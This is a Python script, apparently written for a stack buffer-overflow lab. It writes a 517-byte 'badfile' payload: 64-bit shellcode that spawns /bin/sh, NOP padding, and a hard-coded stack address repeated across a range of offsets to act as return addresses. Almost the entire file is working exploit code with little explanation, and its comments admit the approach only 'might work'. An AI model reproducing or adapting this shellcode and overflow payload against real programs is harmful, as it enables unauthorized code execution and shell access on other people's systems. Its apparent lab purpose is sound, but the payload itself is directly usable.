#!/usr/bin/python3
import sys

# 64-bit shellcode (shorter version to increase chances of success)
shellcode = (
    "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
    "\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b"
    "\x0f\x05"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Special approach for 64-bit:
# 1. Place shellcode at the beginning (first 100 bytes)
start = 0
content[start:start + len(shellcode)] = shellcode

# 2. Instead of trying to control execution with return address,
#    let's corrupt the stack in a way that might work
#    The key is to have a different pattern that will make the
#    program crash in a predictable way

# Fill various locations with the address of our shellcode
buffer_addr = 0x7fffffffbac0  # Buffer start address from GDB

# Create a pattern of potential return addresses
for i in range(100, 300, 8):
    # Lower 6 bytes of address (avoiding NULL bytes)
    content[i:i+6] = (buffer_addr & 0xFFFFFFFFFFFF).to_bytes(6, byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)
